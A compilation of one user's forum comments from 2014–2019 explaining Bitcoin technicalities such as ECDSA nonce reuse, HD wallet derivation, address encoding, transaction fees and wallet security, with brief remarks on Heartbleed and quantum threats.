Like you said, we don't have the full context of the conversation. But it doesn't sound like they're talking about the general case, they're talking about bad randoms used when signing.
Craig says: "You cannot say a bad random, a single transaction and then you can reverse the signing". Taken alone this is false. The security of ECDSA is reliant on using a secure random nonce *k* value. If *k* is known/guessable then it's trivial to reverse engineer the private key from a single signature. Additionally if *k* is unknown but reused for multiple sigs then the key can be recovered.

Breadwallet is a decentralised client that connects to other Bitcoin nodes to download block and transaction data. It runs in [SPV]( mode which only downloads block headers, so the sync doesn't take as long as a full client like Bitcoin Core, but still a fair chunk of data  is needed when initialising a wallet.
Mycelium queries centralised servers that already have the block data synced. It basically asks the servers for all transactions for your addresses and then subscribes to updates. More efficient, less decentralised and different privacy and trust concerns. I say "different" because there are privacy issues with both SPV and centralised options.
@_date: 2016-08-04 02:50:20
Well we don't have the full context since the recording starts halfway through that conversation, but it absolutely is possible to derive the private key from an ECDSA signature if the random nonce (*k* value) isn't random enough. It's a basic fact of ECDSA like the guy said. That particular vulnerability is what caused the blockchain.info hack a while ago.
The fact that this seems to be unknown to "Satoshi" says a lot.

The request data needs to be in JSON format. You're sending it as key=value pairs as plain text. You can use a library like  if you're doing a lot of JSON serialisation, but since this is probably a one-off thing you can just construct the string. It needs to look exactly like `{"hex":"TX_HASH"}`
    var data = "{\"" + Post1 + "\":\"" + Post2 + "\"}";
    var response = wb.UploadString(RequestURL, "POST", data);
You may also need to set the content type

Changing the nonce size now would not be "simple" and would require a hard fork since it would change the structure of the block header. If we do ever fork in the future then we may take the opportunity to change it then.
2^32 is over 4 billion btw, so you're a few orders of magnitude off :) The ASIC part of the miner only concerns itself with hashing a payload combined with an incrementing nonce, but there will always be something that it's connected to (a PC or an onboard controller) that's responsible for feeding it new data before it runs out of nonces. Thankfully recalculating a merkle tree after modifying a leaf node is relatively inexpensive; you only need to recalc the branch that the coinbase transaction belongs to. Generic CPUs are more than capable of keeping up with this demand for the foreseeable future but theoretically this work could also be done by a different type of ASIC or FPGA
@_date: 2019-07-21 15:11:17
To date, the version field has only been used to specify the consensus rules, in a non-backwards-breaking manner i.e. soft forks. Changing the structure of the header itself would be a hard fork which is a huge deal.


Because, as above, it's a massive change to do this. Both in terms of it being a hard fork but also requiring new hardware to do it. All for something that is nowhere near being a bottleneck and extremely unlikely to ever become one.

An individual transaction or block doesn't compress very much because it is mostly random data.
Compressing the entire blockchain is slightly effective (I've heard around 30%?) because of address re-use and other repeated data, but you would lose index/search performance.
@_date: 2017-12-30 05:57:33
Low chance but it happens relatively frequently, sometimes multiple times a day.
Generating a block takes 10 minutes on average, but it's a random process that has exponential distribution. There's a ~0.33% chance of finding a block in 2 seconds, but keep in mind the block timestamp isn't overly accurate so it may well have taken longer.

What you posted decodes to `Salted_` which almost certainly means it was encrypted with openssl. You'll need to decrypt it using a password.

Something like that, assuming it was encrypted using AES. Try different modes if that doesn't work.

Well it may be more intuitive for some to think of addresses as accounts and transactions as sending from one address to another, and a lot of Bitcoin 101 guides are guilty of explaining it that way. But it's not how it works on a technical level. Transactions involve inputs on the "from" side and a set of outputs on the "to" side, where inputs are outputs received from previous transactions. An address is just one particular type of output that we choose to represent in a printable format, but there are other kinds of output scripts that don't involve addresses at all.
Users shouldn't really be concerned about individual addresses, it's only the wallet balance that matters. Addresses are just a way to receive funds or a destination to send to and are supposed to be single use. It's your wallet's job to manage them.
Having said that, if you look up an address on most block explorers, they will show a balance which is just the sum of all unspent outputs for that address.

You don't need an intermediary, you can generate your own addresses pretty easily using a library or plugin for whichever platform your site runs on. The main reason to use something like Coinbase is if you want to seamlessly convert to $ in your bank, which is what a lot of merchants currently do.
For simple things like donations, there's stealth addresses and BIP47 that will allow you to just put a static address/payment code on your site from which the sender can derive any number of addresses. This is still a work in progress though with little to no wallet support as yet.
@_date: 2015-12-20 09:13:11
For Bitcoin Core, there's a pool of 100 addresses by default. So a backup is good for around 100 transactions (incoming and outgoing combined).
For deterministic wallets (Mycelium, Electrum etc) all you need is the seed, which can be used to regenerate all addresses in the wallet.

Hmm actually, it seems to be a function of the minRelayTxFee which a lot of people increased from the default 0.00001 to 0.0001 during the spam attacks. So I guess dust will be 5460 satoshi on a lot of nodes. It probably has poor propagation.
@_date: 2015-06-27 13:50:52


Naw. CLTV only specifies when the output itself can be spent. It has no influence on the outputs of a transaction that spends it. I'm not sure what value the functionality you describe would have? Sounds potentially dangerous too since the sender decides when it can be spent.


P2SH is currently irrelevant when talking about nlocktime. There's no opcode for a P2SH script to access the nlocktime in any way. Which is why it's not very useful and why this BIP exists.

1. If you can recover the wallet/keys, the transaction history will also be restored.
2. You can look up address X on a block chain explorer like  or  and see your transaction. It's not possible to cryptographically prove it was you that made the transaction unless you can recover your wallet.

The older RPi had a hashrate of around 200 KH/s, so 280 of those would be about 0.056 TH/s. The RPi 2 is faster but probably only by a few multiples, not the orders of magnitude required to be comparable. And that's even before taking into account the fact that 280 RPis would likely use a lot more electricity than a single Antminer.
For mining, RPi is only useful for acting as a USB hub/controller for real ASIC miners.

nullc has already explained why a random nonce is unnecessary, but I just wanted to point out that any miners doing that would be significantly disadvantaged because of the computational cost involved. Even the fastest PRNG would be much slower than incrementing, which is one of the simplest computations you can get.
@_date: 2015-12-20 03:34:30
Slight correction: addresses don't have balances as such, but if you want to think that way the balance is the sum of all transaction outputs sent to that address. It's the individual outputs that must be completely consumed when used in a new transaction.
e.g. You receive two transactions of 0.5 BTC to address X (address reuse is bad, but sometimes it's out of your control). If you spend 0.4 BTC, it will only consume one of those 0.5 BTC outputs, not the entire 1 BTC "balance" of the address.
@_date: 2015-06-03 15:49:00
Did you look at the address OP posted? It's clear that's not the case. The ~11 BTC transaction from a couple of weeks ago sent change back to the originating address. The transaction after that is the wallet being emptied.

Hardened means it can't be derived from the parent xpub. It doesn't mean the children can't be derived.
So with BIP44, the account xpub allows derivation of all addresses in the account (because change / address_index aren't hardened). The root xpub is useless because its child purpose' is hardened. Same for any xpub above account.

Yes it's still correct. And it is only relatively early block rewards (up to around 2012) that pay to pubkey instead of address. It was the default behaviour of the miner built into bitcoin-qt which was gradually replaced by custom miners/pools that pay to addresses. Pay to pubkey would be very rare today.
Note there are still some situations where your pubkey may be known to others even without spending. e.g. with multisig addresses, the participants know each others pubkeys because they're part of the redeem script. Also some HD wallets e.g. myTREZOR send your xpub/master public key to the server, which is equivalent to knowing all public keys in your wallet.
edit: Also a signed message reveals the pubkey in much the same way spending does.

You actually do, because the last step of base58 encoding is to add back a 1 for every leading zero byte. That's why there's a minimum of 26 chars and not a lot less. e.g. address for hash160 of 0x00 is 1111111111111111111114oLvT2 and not just 14oLvT2. I'm not entirely sure why this rule exists tbh.
This padding also messes with your odds calculations. I'm not sure of the figures, but less than 33 characters is **very** rare. I just ran a simulation of 1 million addresses and didn't get anything under 33.
If there was no padding, the odds would be as you say.

The transaction has a tiny change output that's below the dust threshold, and most nodes have ignored the transaction due to spam rules. As others said, you won't lose anything because it hasn't gone anywhere. Your wallet should forget it after a while. Alternatively you could try restoring from a backup, or forcing a wallet refresh if that's possible. I'm not familiar with Bitwallet so can't give exact instructions.
It's a wallet bug really. bitcoin-qt and most others will prevent this situation by adding the tiny bit of change to the fee instead. I recommend submitting a bug report to Bitwallet.

a) An address is actually 25 bytes: 1 byte version prefix + 20 bytes payload + 4 byte checksum. Base58 can encode log₂58 = 5.858 bits per character. So to encode 25 bytes (200 bits) you need ~34 Base58 chars.
b) Depends on the number of leading zeroes, which are truncated when converting to Base58. Most addresses are 33 or 34 chars long because the majority of hash160 values will have 1 or no leading zeros.

It generates the keys in order (that's the deterministic part), and keeps generating until it finds a run of sequential addresses that haven't been used yet and then gives up. How far it keeps looking ahead is called the gap limit, which varies between wallets.
@_date: 2015-06-15 11:30:04


No, it's **gap** limit, not an address limit. For there to be a problem in your example, you would have to leave a gap of more than twenty consecutive unused addresses e.g. addresses 34 - 56 unused, but then 57, 58, 59 used. The wallet with 20 gap limit would give up at address 54 when restoring. It would be pretty hard to get yourself into that situation though. Some wallets let you override the default gap limit, or alternatively you could "close the gap" by sending something to say address 54.


BIP44 default is 20.

It is true if you have all your funds in a single output, which means you've only ever received one funding transaction to your wallet. A lot of wallets will allow you to spend unconfirmed change though, but during the malleability attacks this was a problem. If you only have a single large output, it's probably a good idea to split it into a several new addresses.
Wallets also usually prioritise outputs that more closely match the amount you're trying to spend i.e. minimise the amount of change.
@_date: 2015-06-08 18:23:29
1. Yes. HD wallets currently use various combinations of BIP32, BIP39 and BIP44 and not all of them are compatible with each other unfortunately. e.g. Mycelium, Trezor and Multibit HD are compatible, but Electrum does things slightly differently. Regardless, the algorithms are all well known so even if a wallet disappears it would not be a problem.
2. Sounds right. Worth noting that addresses that start with 3 aren't necessarily multisig. They are P2SH (pay-to-script-hash) addresses, which could be many things other than multisig. But multisig would be the most prevalent type of P2SH address.
3. This is a bit of a philosophical argument about what's "technically correct" and is difficult to fully explain unless you have a good understanding of inputs and outputs and scripts. Which is why it's common to start with the address = account number analogy. Addresses are a type of [output script]( (pay-to-pubkey-hash) that are conveniently represented as a string of numbers and letters. Although less common, there are scripts that don't translate to any kind of address. The scripting language can be quite powerful, allowing for [contracts]( etc.
4. Yes, but it's usually referred to as Mainnet (vs Testnet)
5. Where did you read that? EOT is End of Transmission which is 0x04 in ASCII but that's irrelevant/coincidental. Public keys can also start with 0x02 or 0x03 if they're compressed.

They do include a fee. It's not a matter of confirmations since Bitpay/Gyft accept 0-confirmations.
The problem is that for whatever reason, sometimes there's a huge delay before a Coinbase transaction even gets sent to the network. There is a way around it if you know what you're doing though. If you view the transaction inside Coinbase, click advanced details, you can get the raw TX details and push the transaction yourself. You shouldn't have to though, they seriously need to fix their shit.

If you mean in relation to the PIN: none. The PIN is only there to prevent opportunistic theft e.g. a co-worker using your phone while you're away from your desk. Keys are stored in app-private storage so it's safe from other apps, but if your phone is stolen, the thief could root the phone and gain access to the key database. You could use Android's device encryption to protect against this.
The backup option uses BIP38-based encryption (Scrypt+AES).






No, but they're working on that apparently. Change is currently sent back to the same address.

It's an extension of SSL that allows you to keep a session active. You basically occasionally say "Hello I'm still here, don't hang up on me" and the server replies with "Righto". But it's possible for a bad guy to trick the server and make a message like "Hello I'm still here. Tell me a secret lol" and the server replies with "Hey. My password is hunter2".
A bit more technical: the "secret" is 64 KB of memory used by the process. This could be anything and most of the time is probably junk, but the attacker can repeat the heartbeat requests over and over until they get something juicy. It could be the SSL certificate private key, which would compromise all HTTPS communication to that server. It could be user passwords, anything really. Potentially anything that the process has loaded into memory.

Yes, the wallet you imported into will have generated the change address, and therefore knows about it and has its private key. The leftover 0.5 BTC is in that wallet now, and not on your paper wallet (unless you manually send it back, or use a wallet that doesn't generate new addresses for change).

You don't even need to withhold. The 51% miner can keep broadcasting their blocks and ignore blocks from others and just keep blindly mining their own chain. Blocks from the rest of the network will be orphaned, the dishonest miner effectively steamrolls over the top of them since they are guaranteed (in the long run) to generate the longest chain. This is the part that JorgePasada seems to be missing.

Not quite. There is actually a difference between a public key and an address. The public key isn't used very often by the end-user, but there are a few cases where it's needed e.g. multisig/P2SH.

OK yeah I see the transaction has 1500 outputs which is pretty extreme, but still valid.
This seems like a limitation of the Schildbach wallet. There are likely ways they could implement it more efficiently but haven't yet for whatever reason. After receiving and validating the transaction I can't see why they couldn't discard/archive the outputs that aren't yours since they're irrelevant unless you want to see all the details of the individual transaction.

[BIP39]( allows for exactly what you're asking for. I was under the impression that Electrum 2.0 would implement BIP32/39, but the last time I checked out the 2.0 dev build I found they implement their own slightly different version of BIP39 and there was no option for a passphrase. I don't know if that's a work-in-progress or they intend to keep it that way.
Trezor and Mycelium do implement BIP39 properly and allow for a password-protected seed.

Try not to think of an address as having a balance. A balance is just an abstraction that represents the total of all unspent transaction outputs it has received. If an address has received multiple transactions, a transaction spending from the address can choose any combination of those outputs as its inputs. You don't have to spend all of them at once.

Because quantum computers aren't magic machines that can compute anything instantly. They would be really really good at a subset of problems, like factoring, but not so good at others. Basically any problem that can be massively parallelised is fair game, and hashing isn't one of these.
[Shor's algorithm]( would effectively break RSA, elliptic curve and probably other forms of asymmetrical crypto.
[Grover's algorithm]( could potentially reduce any brute force search from O(n) to O(n/2) so AES-256 would be weakened to AES-128 and SHA-256 to SHA-128. Only weakened instead of totally broken.

Two things:
1. They are generating a compressed key, but the address they show is for the equivalent uncompressed key. So if you import the key somewhere, it will import a different address than the one you funded. You can recover funds but you need to dick around with bitaddress.org or brainwallet.org to convert to an uncompressed key.
2. Their import doesn't support compressed keys i.e. the same keys they just generated for you. They said they fixed this but I just tested it and it looks like they haven't.

By the poster: 
@_date: 2014-02-13 11:58:56
Are you asking from a privacy point of view? Or just out of interest?
Wallets like bitcoin-qt generate random addresses that have no connection to each other. The only thing that links them is the wallet.dat
Electrum and Armory are deterministic wallets where there is a mathematical connection between the addresses instead of being purely random. From the root key/seed you can generate all the private key/address pairs in the wallet. There's also the master public key (chain code in Armory) that lets you just generate the addresses without their keys. But without the seed/mpk there's nothing linking your addresses from an outsider's point of view.
One thing to keep in mind though: when you spend your BTC, the transaction may draw from multiple addresses e.g. Address1 has 1 BTC, Address2 has 0.5. You want to spend 1.5 BTC, the transaction will have both addresses as inputs which pretty much reveals that you own both.

You've just illustrated why brain wallets are such a bad idea, even for people who seem like they know what they're doing.
Humans are terrible at understanding entropy let alone generating it. "my favorite color is blue and roads are gray" is NOT random. It has structure, it has patterns, it has words drawn from a limited wordlist. The number of characters is irrelevant, it's the number of tokens that matters and it only has 9. The character substitutions add only a few bits of entropy at best.
The article you linked is talking about *random* passwords. Scroll down a bit to the Human-Generated passwords section. A random 27 character password would look like "0JMrb51f8yInxq5HqNB667pcPoI". Note how it's chaotic, there's no structure, it's difficult to memorise. The difference in entropy between that and what you describe is immense.
Brainwallets: just don't.

@_date: 2014-04-19 04:39:21
It's 128 bits of entropy, which is adequate to say the least. And there's also key stretching involved which would slow brute force attempts.
That warning message is interesting ... I think it might be a throwback to when they used a more naive algorithm, or they're erring on the side of caution. A single private key will not expose the entire wallet, but a private key + master public key will. This is true even for BIP32 for non-hardened keys.
@_date: 2014-08-16 17:53:00


That's because it's an address, not a private key. You can't BIP38 an address of any kind, multisig or not. Does not compute ...
You could individually BIP38 encrypt each private key used to create the multisig address. bitaddress.org doesn't have the option to encrypt existing keys, but bitcoinpaperwallet.com and bit2factor.org do.

tl;dr There's effectively two different ways of doing m-of-n. 
There's the Pay-to-script-hash P2SH method which is what Gavin's test transaction uses. That's where you generate a new multisig address from other addresses using `createmultisig m ['pubkey1, 'pubkey2', ...]` which gives you an address starting with 3.
The output looks like `OP_HASH160 &lt;scripthash&gt; OP_EQUAL` and because it's just a hash, it's not possible to see what the script is or which 'real' addresses are involved. It could be any script, not just m-of-n
The other way is [BIP0011]( where you don't create a new address, but use OP_CHECKMULTISIG directly in the output script.
e.g. `OP_1 &lt;pubkey1&gt; &lt;pubkey2&gt; OP_2 OP_CHECKMULTISIG`
Here the pubkeys are visible which is why blockchain.info can say it's an escrow tx and show the addresses.
@_date: 2014-01-06 03:34:36
Does the key start with a 6? If so, you used BIP38 to encrypt it with a password, so you'll need to decrypt it first. You can do that on the Wallet Details tab of bitaddress.org (preferably the offline copy you saved when creating it). bitcoin-qt doesn't do BIP38 yet (if ever). AFAIK only blockchain.info and Mycelium have support for BIP38 so far.

They're not published on the blockchain or anywhere public, so it would only be a problem if the wallet provider has access to a quantum computer. I'm not aware of any wallets that make people's xpubs public. Ignoring quantum issues, that would be a huge privacy violation.
Armory would be fine because it's all local. Even Electrum and Mycelium are fine because they only send addresses when querying the server, not xpubs.

Definitely important to be aware of the risks, but also important to understand the nature of the attacks. I would never keep a significant amount on a phone, but the risks of malware are often overstated.
All apps run in their own sandbox so it's not possible for an app to directly steal your private keys for example. There's no permission that would allow that, and if it was somehow possible it would be a massive hole in the security model and would be patched quickly. It's not like Windows where if you install something, it has access to the entire filesystem.
Apps can snoop your SMS messages if you grant that permission, which could be a problem for 2FA and password reset requests. 
Never copy anything sensitive to the clipboard since that is accessible to all apps. If you copy a payment address, it could be switched to a different one without you noticing, same as on a PC.
Be very wary of alternative keyboards. These can't be activated without your knowledge, but if you do allow a custom keyboard it could be a keylogger. Also 3rd-party QR scanners could be a problem. Mycelium uses its own scanner so not a problem there, but I'm not sure if all Android wallets do.
If you start playing with custom ROMs and rooting your phone, then you're asking for trouble unless you really trust the source.
Be careful, but don't freak out.

You're affected if during the time the bug was active, you:
1) created a new wallet  
2) added an address to existing wallet  
3) **made any outgoing transaction from any address in your wallet, even if the address was created a long time ago**

It's really not that confusing and this post seems to be full of people that haven't even read the BIP39 spec.
It's designed to be wordlist agnostic. When restoring from seed, a wallet doesn't even need to know the wordlist used except to verify the checksum and show a warning if it doesn't match. If wallets are strictly enforcing that check then they're not doing it right.
The wordlist is more important when generating the mnemonic. It needs to be 2048 words because the step converting from bytes to words is a simple table lookup based on a 32 bit index.
What you say about HD wallet structure is true, and that's being addressed by BIP44 which is not really related to BIP39 and wordlists.

I've wondered the same, but looking at the BIP32 key algorithm, the final step is HMAC-SHA512 so I don't think an EC-only attack is possible.
A private key + master public key does compromise that part of the tree though even without quantum hacks (for non-hardened child keys anyway).

No. That is called a ~~chosen~~ known plaintext attack and if it were possible the wallet encryption would be useless.
It is theoretically possible to extract the key from memory, but would require a lot of time and expertise and may not be practically possible in the end. There's no off-the-shelf tool to do this. It would be the key data derived from the password, not the password itself, and it will look like random data so would be hard to find unless there was some kind of marker.
A lot (most?) Linux distributions have the /dev/mem disabled so a memory dump probably wouldn't be possible without a reboot anyway. It might be possible with LiME Forensics without a reboot but it's very complicated.
Your best bet is to export all the keys, manually or via a script, and kiss the LTC goodbye.

You're right, it doesn't know. It's ignoring the checksum when decoding the hash160, and recalculating the 'correct' checksum in the toString(). Seems a little strange but I guess it's  just a design decision. Personally I prefer how bitcoinjs and bitcoinj don't even let you construct an Address object if it's invalid. It fails fast and you don't need to remember to call isValid()
The bug in isValid() is fixed now at least.

Unless it's your tx, it's impossible to say for sure which output is the change.
@_date: 2014-10-15 17:06:12


Wallets don't even need the same word list to be compatible. When restoring from seed, the word list is only needed to validate the checksum, and that's supposed to only show a warning. If implemented to spec, a BIP39 wallet should allow any mnemonic phrase.
As you said, the real problem is wallet structure and that's what BIP44 is *attempting* to standardise.

I think the reverse would be true. The banking system is made up of a mish-mash of competing crypto products all depending on each other. It would be a big task to update everything.
With Bitcoin the crypto is all in one place and it would be relatively easy to switch in alternative algorithms if they are needed. I think there are already [contingency plans]( being made for this. e.g. they could introduce the concept of address type/version. So based on the address type, you'd use X signing algorithm. If an address type was considered compromised then you'd transfer the balance to a new safe address.
It would be a protocol update and effectively a fork, but it would be an easy one to get community consensus on.
There are already quantum-safe algorithms available, but the keys are pretty huge and would unnecessarily bloat the blockchain at the moment, but they're there if we ever need them.
@_date: 2014-08-26 13:40:50
Mining has no concept of *progress*, it's a random process and there's nothing to lose by switching mid-race. It's common to update periodically to include new unconfirmed transactions that come along. 
@_date: 2014-01-12 19:24:40
I'm guessing he's talking about the ECDSA side of things which uses a 256-bit private key. That could be extended to use a larger key, but it would also lead to larger addresses and public keys that take up more space in the blockchain. 256-bit ECC is already very safe from brute forcing, and if a vulnerability was ever found or quantum computing became a reality, it's likely that larger keys wouldn't help much. If Bitcoin ever needs stronger crypto, it will be a new algorithm not just bigger keys.

The issue is with the wallet you used, not Bitcoin. It created a non-standard transaction - the change output is below the dust limit. Only Eligius mines transactions like this, which is why it took a while.
Submit a bug report. A proper implementation (e.g. Bitcoin-QT) would have just added the tiny amount of change to the fee.

Mycelium. The other wallet is much the same except no PIN and no signing (not that I could find anyway).
The main difference is that the Schildbach wallet is a true SPV client like Multibit. Mycelium is dependent on semi-centralised servers much like Electrum. The servers never know your private keys though.

Reusing addresses by itself doesn't reveal k, but combined with a bad RNG when signing leads to disaster.

Well that's good. Keep in mind that you don't actually control that address, it's just for receiving funds to credit to your account. Often Coinbase/whatever exchange it is will sweep the funds off to cold storage, or it will be consumed as part of another user's withdrawal. That's just the nature of shared wallets. As long as your balance within the site is correct, there's nothing to worry about. The balance of the address is irrelevant.

Interestingly, the tech was licensed from Certicom who founded SECG. I'm guessing ECC was just for key exchange and symmetrical encryption used from that point on (much faster). Probably some variant of ECDH since Hellman (of Diffie-Hellman fame) was involved and Certicom holds some ECDH patents.

Point 6 is where the private key *d^A* is used. Note there's no mention of the public key *Q^A*. That is only used when verifying a signature.
Where do you think the private key is used if not during signature creation? That's literally the whole point of having a private key.

That was my understanding too. When restoring from mnemonic, the dictionary shouldn't even be used except for validation of the checksum which is supposed to be an optional feature (just a warning). Unless the wallets are doing BIP39 wrong, I suspect the incompatibilities people are seeing are down to differences in the BIP32 wallet structure which is what BIP44 is supposed to address.

True, I just checked the code and you're right. I always assumed the P2SH redeem script was held to the same standards as if it was an output script, but apparently that's not so.
So the scriptSig size limitation is 500 bytes and will affect the *m* value. With compressed keys you might be able to squeeze in 5 sigs+pubkeys, otherwise 3 for uncompressed.
The scriptPubKey/redeemScript limit is 520 bytes and that's a hard limit, not just a non-standard check. So by my calculations that means *n* can only be 15 when using compressed keys or 7 for uncompressed.
Ugh, messy.
@_date: 2014-11-02 00:50:05
Which wallet did you use? It created a non-standard signature (wrongly encoded) so the transaction never propagated and will probably never be mined.
If it's an old wallet, you should upgrade. Otherwise submit a bug report.
It's possible for someone to fix the transaction and resend it, but since the Coinbase invoice would have expired that's not a good idea.

Losing BTC to transaction fees is pretty rare and difficult to pull off these days. The only example I know of is someone that used an old version of brainwallet.org to craft a raw transaction and forgot to include a change output. The latest version makes that pretty much impossible. Noobs shouldn't be messing about with raw transactions anyway.
The most common way of losing BTC is this: 
tl;dr Import paper wallet into bitcoin-qt/armory/anything that uses change addresses. Spend some BTC. Wrongly assume paper wallet just has less balance now and throw away or forget about the wallet you imported into. In reality your paper wallet is now empty and the remainder is in the other wallet.

Well that rule hasn't made it into the stable release yet, which is what the TOR bundle uses. It's only in the 4.0 development release. There are only four btc* sites in 3.x and none of them are btc-e.com
I just tried btc-e again in TOR and I was "lucky" enough to get an exit node doing the MITM. Manually switching to HTTPS gives an SSL error because they're using a self-signed cert. 
I still don't understand how OP managed to get to the non-HTTPS version of the withdrawal confirmation page though. The link in the email is definitely https. did you get two withdrawal confirmation emails by any chance? Perhaps a legit one and a bogus one from the attacker. \*edit\* on second thought, I don't see how the attacker could possibly send you an email since btc-e never actually shows your email address anywhere. So how did you get from the https withdrawal link in the email to the non-https version in your screenshot? What were your exact steps?

They store an encrypted copy of your wallet on their servers, which is downloaded and decrypted in your browser using your password at login. Their mnemonic isn't even 12 words, it depends how long your password is. It also changes if you change your password.

Because it's a repost: 
@_date: 2014-07-28 11:44:10
It is consecutively, and when restoring from seed it looks for blocks of unused addresses to know when to stop looking. In Electrum, the gap limit is 5 by default which is quite small but can be overridden if needed. Armory looks in blocks of 100, with a button to manually keep looking beyond that. But for normal use, the default gap limits should be fine. It's only really merchants or people handing out a LOT of addresses that would need to fiddle with settings.

One concern is privacy. Since lightweight clients only ask for transactions they care about, they can leak information to servers/nodes about which addresses you own.
SPV clients that use [bloom filtering]( can ask for transactions they don't really care about in an attempt to hide the real addresses. Very light clients like Mycelium don't do this. It becomes a tradeoff between bandwidth and privacy.

Just to confirm, 14MC1rFAFmma3ngDzkEjyZjoc8B3Y4rNxJ is your deposit address at Cryptsy right? The fact that your 5 BTC has since moved on is strange. It suggests Cryptsy has processed it in some way but hasn't credited your account.
I don't want to freak you out, but the address 1Facb8QnikfPUoo8WVFnyai3e1Hcov9y8T used in the later transaction has been mentioned in a few places talking about various hacks.

I don't think this is right, unless you're talking about a different password.
The main password encrypts the whole wallet file. The secondary password encrypts the private keys within the file. So if you use double encryption, the first password will only let you see the addresses and balances, and you'll need the 2nd password to decrypt the private keys.
Confirmed when importing into Multibit it requires both passwords.

BIP38 is irrelevant here. It's just a way to encrypt a private key for safe storage and has no impact on the transaction signature. If you had imported a BIP38 key into bc.info and spent from it during the time the bug was live, whatever amount you didn't spend would have been vulnerable to theft (or rescue by johoe if you were lucky).


That link was just to counter your claim "I could "re-use" an address 100,000 times without a single security risk" by showing there are theoretical attacks out there that rely on multiple signatures to work, something that only happens with address reuse. It is a very theoretical attack at this point. But the non-random/repeated *k* value problem is very real.

That's an address that I have shared with others, one that could be publicly linked to me. The [most recent transaction]( sends to an address that was [swept up]( in the Silk Road seizure. To an outside observer it looks like I sent funds directly to a Silk Road hot wallet address.
I never used the Silk Road (I swear officer), that's just my deposit address at Coinjar which runs a shared wallet. I didn't make the outgoing transactions.
I guess shared wallets and Coinjoin type transactions are another defense against this kind of blockchain analysis.

You're using a definition of coinbase that I'm not familiar with. Only generation transactions have a coinbase, which is where the inputs would normally be. Confusingly, coinbase is also often used as another word for generation transaction. Normal transactions don't have a coinbase.

@_date: 2014-03-23 18:22:04
Looking at your totals, your incoming does outweigh outgoing by a factor of 4. I think the graph is being a bit misleading. Those outgoing spikes must be tiny short bursts that add up to a lot less than the slow but constant stream of incoming tx and blocks.
I'm not getting the same regular outgoing spikes. Not sure what the difference is.

Clone coins use a different version byte which causes it to have a certain prefix when converted to base58. You can't have the same address across multiple coins.

This raises a relevant side-question: why do some wallets still use uncompressed pubkeys? I wish I knew. The transition has been a lot slower than I would have thought. Even the current version of Electrum still uses uncompressed keys. You save 32 bytes per input, which isn't much I guess, but blockchain space is limited and there's no downside to using compressed keys.

Interesting idea, but I'd advise caution before anyone actually uses it. The encryption algo that Jeeq uses hasn't been reviewed and isn't based on any kind of standard that I'm aware of. There could be a flaw that allows the message to be decrypted, or even worse allows the private key to be determined. Even a well-established algo like ECDSA has that problem if it's implemented even slightly wrong or uses bad RNG.
I'm not a Python guru, but it looks like it's using the standard `random` class which isn't cryptographically secure. Should be using os.urandom or something similar.
Not sure how useful it would be in practice since you need the recipient's public key which is not published anywhere unless the address has been previously spent from.
@_date: 2014-05-19 23:19:37
Sadly, no. You need to wait until enough nodes have forgotten about the transaction (i.e. dropped it from their mempools) and then attempt to respend it. If you try too soon, it's likely the second transaction will be rejected as a double spend and won't even propagate enough to reach a miner (unless you happen to be connected directly to one). How long you need to wait is undefined too since there's no rule for how long an unconfirmed tx should stay in a node's mempool. Tis messy.

The first part sounds like user error. Not sure why you'd think you could make only part payment in BTC. I don't know many sites that work like that. Once you pick a payment method, you need to pay the full amount using that method.
You should contact Overstock / Coinbase for a refund on that transaction, if it hasn't already auto-refunded.

This isn't anything new. The ECDSA algorithm requires a random number (aka a nonce) for each signature. If you have two signatures using the same private key and nonce, it's possible to calculate the private key from the signature alone. So obviously it's very important that the nonce is random for each Bitcoin transaction.
There was a flaw in the Android random number generator that lead to multiple transactions being signed with the same nonce.
A similar bug also happened with blockchain.info
   (note what they say about the Android bug here is wrong, it was about signing not address generation)
Also worth noting that the vulnerability only exists if you reuse addresses since it needs two or more signatures from the same address in order to work.

@_date: 2014-12-14 23:45:45
ECDSA, the signing algorithm that Bitcoin uses, requires a random value *k* to be generated for each signature. If this value is predictable or reused across two signatures for the same address, then this allows the private key to be calculated with very little effort. 
This is exactly what happened with blockchain.info recently, and the Android SecureRandom bug last year. When combined with address reuse, this leads to massive loss of funds. One or two bad signatures and the address is compromised regardless of how well you secured your private key. And you lose your entire wallet because all of your funds are on that single address. Without address reuse the impact is reduced because 1) your funds will usually be spread across many addresses and 2) each address is usually spent fully in a single transaction leaving nothing behind to steal if it does happen to be compromised.
So address reuse makes a bad situation much worse. There are also other related vulnerabilities that are only possible with address reuse e.g.  where even a slight weakness in the signature *k* value can be exploited if the attacker has lots of signatures available to work with.
Thankfully there's a solution to this bad RNG problem that a lot of wallets are already using: [RFC6979]( Guess which wallet isn't using it yet?

I tested the exploit on a site I control before applying the patch. I was expecting to see mostly junk, but it didn't take many attempts before I started seeing plaintext POST and cookie data of other users. And this is on a relatively low traffic server. I was amazed how easy and effective the exploit is.
If the users getting hacked were all recently using the site between disclosure and patching, I think it's believable that it's due to Heartbleed. 
As for why financial sites haven't been hit (yet), they're more likely to be using commercial enterprise-grade software not dependent on OpenSSL, and also if they're big enough probably received advance warning. It's early days yet, I wouldn't be surprised if we start hearing about actual exploits soon.

110% sure. 
A type-1 deterministic wallet would work kind of like how you describe, where key^*n* = sha256(seed+n) or something similar, and the public key derived as normal. AFAIK this type was never implemented by any major wallet, and was limited in use to a few tools.
Type-2 deterministic wallets are a little more complicated and use some tricky Elliptic Curve maths. These allow you to have a seed, and a master public key derived from it that can be used to generate addresses only. If you really want to know the details, check out the [BIP32]( spec, and gmaxwell's initial post about the idea of type-2 deterministic wallets: 
Electrum and Armory have their own slightly different algorithms but rely on the same basic idea. They're both moving to BIP32 now that it is standardised.

It's true that BIP32 uses pretty standard and well-vetted crypto primitives, but history is littered with examples of people using good crypto in stupid ways.

Which wallet? Sometimes transactions get stuck and don't actually send for whatever reason. e.g.

@_date: 2014-07-07 11:44:47
You're correct. An nlocktime transaction is only propagated and accepted into the mempool if it has a chance of being accepted into the next block i.e. block height is the same as the current height, or time constraint has been met. It's treated as a non-standard TX otherwise.

blockchain.info is now on the [HSTS preload list]( but that probably hasn't made its way into the Tor browser bundle yet. It's also only in the dev release of HTTPS Everywhere last time I checked.

Just like how every private key has its public key and address, a deterministic wallet seed (AKA master private key/mnemonic) has a corresponding master public key (mpk or xpub). 
In Electrum, it's viewable from the menu Wallet &gt; Master Public Key. In myTREZOR it's in advanced options somewhere. I don't think Mycelium shows it but it would store it somewhere.
The mpk allows you to generate the addresses in your wallet, but not the private keys. Alone it's not a security risk, but it is a privacy risk since it allows the holder to know all addresses in your wallet, current and future.
